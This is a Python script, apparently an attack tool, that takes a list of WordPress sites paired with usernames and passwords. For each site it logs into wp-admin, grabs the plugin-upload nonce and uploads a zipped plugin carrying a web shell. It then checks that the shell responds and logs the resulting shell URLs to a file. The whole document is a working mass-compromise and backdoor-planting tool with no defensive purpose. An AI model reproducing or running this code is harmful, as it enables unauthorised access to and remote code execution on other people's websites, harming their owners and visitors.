import sys
import requests
import re
import datetime
import os.path
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init

init(autoreset=True)
fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT

print(f"""{fg}{sb}
⠀⠀⠀⠀⠀⠀⠀⣀⠴⠚⠉⠁⠀⠀⠀⠀⠀⠈⠉⠳⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡞⡥⠀⠀⠀⠀⣠⠴⢀⣠⠤⢦⡀⠀⠀⠀⠀⠀⠈⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⡞⢸⠁⠀⠀⣠⢚⡥⠚⠉⠀⠀⠘⣗⡄⠀⠀⢰⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢾⠇⡎⠀⠀⣰⡳⠋⠀⠀⣠⣤⠶⠢⡿⣸⣆⠀⠈⣧⣄⢸⠁⠀⠀⠀⠀⠀⠀
⠀⠀⢸⡄⢳⣠⣾⡟⠓⠆⠀⠘⠙⢀⣤⣶⢿⣤⣹⡅⠀⣿⠈⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡇⠸⡇⣾⡛⣶⡦⠀⠀⠀⠛⢱⢼⣷⠸⠋⢣⠀⡇⣹⠛⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢱⠀⠹⣏⠉⢟⣻⣀⠀⠀⠀⠐⠛⠛⠐⠀⠘⣴⡽⣇⠀⢸⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⢇⠀⠘⡄⠀⠀⢸⡁⠀⠀⠀⠀⠀⠀⠀⠀⣿⢀⢹⡀⠈⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢦⠀⢻⢦⡀⠈⠰⠶⠒⠂⠀⠀⢀⡤⠀⡇⢘⡆⢇⠀⠸⣷⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠳⡼⡀⣟⡶⢄⡀⠀⢀⡠⠖⠁⠀⢀⡇⢸⢻⠸⡀⠀⣿⢇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠏⢳⠟⢀⠷⠈⣹⡇⠀⠀⠀⠀⣼⢣⡞⢸⠀⡇⢰⣼⢸⠀⠀⠀
⠀⠀⠀⠀⠀⢀⠎⣠⠋⢀⡼⠟⠊⠟⠀⠀⠀⠀⠀⣿⠀⠑⢯⣀⣇⣎⢏⡞⠀⠀⠀
⠀⠀⠀⢀⡠⠾⠔⠓⢞⣁⣀⣀⠀⠀⠀⠀⠀⠀⠀⢻⣀⣀⣀⡈⠛⠿⠯⣀⠀⠀⠀
⠀⠀⢠⠋⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠐⠉⠉⠉⠉⠉⣧⡀⠀⠀⠀⠀⠀⠀⠑⡄⠀
⠀⠀⢻⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠧⠀⠀⠀⠀⠀⠀⠀⢹⡆
⠀⠀⢸⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⡼⠃
⠀⠀⠘⡤⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠀⢠⠇⠀
⠀⣠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⡎⠀⠀
⢠⠇⣠⡂⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠘⡄⠀⠀⡸⠀⠀⠀
⢸⡀⠛⠄⢀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⢀⠵⠀⠀⡇⠀⢀⠇⠀⠀⠀
⠀⢷⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⠂⠀⠀⠀⣰⠁⠀⣾⠀⠀⠀⠀
⠀⠀⠑⢤⣀⠀⠀⢀⣠⠴⠋⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⣀⡴⠁⠀⢠⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢠⢻⠉⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⠒⠒⠉⡽⠀⠀⠀⡼⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣾⠀⠐⠀⠀⠀⠀⠀⠑⢤⡀⠀⠀⠀⠀⠀⡇⠀⠀⢠⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡄⠀⠀⢠⡀⠀⠀⠀⠀⠙⣄⠀⠀⠀⢰⠁⠀⠀⣼⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢿⣇⠀⠀⢸⠀⠀⠀⠀⠀⠀⠈⠁⠀⢀⡜⠀⠀⠀⡗⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⢸⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡆⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠐⡇⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣻⠁⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠃⠀⠀⠸⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡼⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⠏⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀

                [#] Advanced Uploader - Plugins WordPress [#]
                            credit for : azamTcodeR


""")

if(len(sys.argv) != 2):
    path = str(sys.argv[0]).split('\\')
    print(f'  [!] Enter <{path[len(path)-1]}> <wordpress.txt> \n      The list must be (http://domain.com/wp-login.php#username@password)')

else:
    if os.path.isfile(sys.argv[1]):
        sites = open(sys.argv[1], 'r')
        file = str(input(f'{fy}{sb} Put Your Zipped File (UBH) : '))
        if os.path.isfile(file):
            if '.zip' in file:
                pluginname = str(input(f'{fo}{sb} [+] Your Plugin Name ex: (ubh) : '))
                shellnamezip = str(input(f'{fy}{sb} [#] Shell Script : '))
            findString = str(input(f'{fc}{sb} [:=>] Name Of Your Shell (String) : '))
            print('')
            for site in sites:
                try:
                    site = site.strip()
                    req = requests.session()
                    pLogin = re.compile('http(.*)/wp-login.php#(.*)@(.*)')
                    if re.findall(pLogin, site):
                        dataLogin = re.findall(pLogin, site)
                        domain = 'http' + dataLogin[0][0]
                        user = dataLogin[0][1]
                        password = dataLogin[0][2]
                        print(f"{fc}{sb} [*] Site : " + domain + "/")
                        print(f" [*] Username : " + user)
                        print(f" [*] Password : " + password)
                        pattern = re.compile('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"')
                        post = {'log': user, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': domain + '/wp-admin/', 'testcookie': '1'}
                        try:
                            login = req.post(domain + '/wp-login.php', data=post, timeout=30)
                        except:
                            print(' [-]' + f'{fr} Time Out \n')
                            invalid = open('invalid.txt', 'a')
                            invalid.write(site + "\n")
                            invalid.close()
                            continue
                        check = req.get(domain + '/wp-admin', timeout=60)
                        if 'profile.php' in check.text:
                            print(' [+]' + f"{fg} Successful login")
                            plugin_install_php = req.get(domain + '/wp-admin/plugin-install.php?tab=upload', timeout=60)
                            if re.findall(pattern, plugin_install_php.text):
                                id = re.findall(pattern, plugin_install_php.text)
                                id = id[0]
                                update_php = domain + '/wp-admin/update.php?action=upload-plugin'
                                shellname = open(file, 'rb')
                                filename = file
                                filedata = {'_wpnonce': id, '_wp_http_referer': '/wp-admin/plugin-install.php', 'install-plugin-submit': 'Install Now'}
                                if '.zip' in file:
                                    fileup = {'pluginzip': (filename, shellname, 'multipart/form-data')}
                                else:
                                    fileup = {'pluginzip': (filename, shellname)}
                                Cherryreq = req.post(update_php, data=filedata, files=fileup, timeout=60)
                                if '.zip' in file:
                                    shell = domain + '/wp-content/plugins/' + pluginname + '/' + shellnamezip
                                    check_plugin_shell = requests.get(shell, timeout=60)
                                    if findString in check_plugin_shell.text:
                                        print(" [+] " + shell + ' =>' + f'{fg} Successful upload\n')
                                        shellsFile = open('shells.txt', 'a')
                                        shellsFile.write(shell + "\n")
                                        shellsFile.close()
                                    else:
                                        print(" [-]" + f"{fr} Failed upload\n")
                                        upUP = open('unUP.txt', 'a')
                                        upUP.write(site + "\n")
                                        upUP.close()
                            else:
                                print(" [-]" + f"{fr} Upload page not Working\n")
                                upUP = open('unUP.txt', 'a')
                                upUP.write(site + "\n")
                                upUP.close()
                        else:
                            print(' [-]' + f'{fr} Failed login \n')
                            invalid = open('invalid.txt', 'a')
                            invalid.write(site + "\n")
                            invalid.close()
                    else:
                        print("  Error in list !\n  Must be : http://domain.com/wp-login.php#username@password")
                except:
                    site = site.strip()
                    print(' [-]' + f'{fr} Time Out \n')
                    invalid = open('invalid.txt', 'a')
                    invalid.write(site + "\n")
                    invalid.close()
                    continue
        else:
            print("       File does not exist !")
            sys.exit(0)
    else:
        print("      " + sys.argv[1] + " does not exist !")
        sys.exit(0)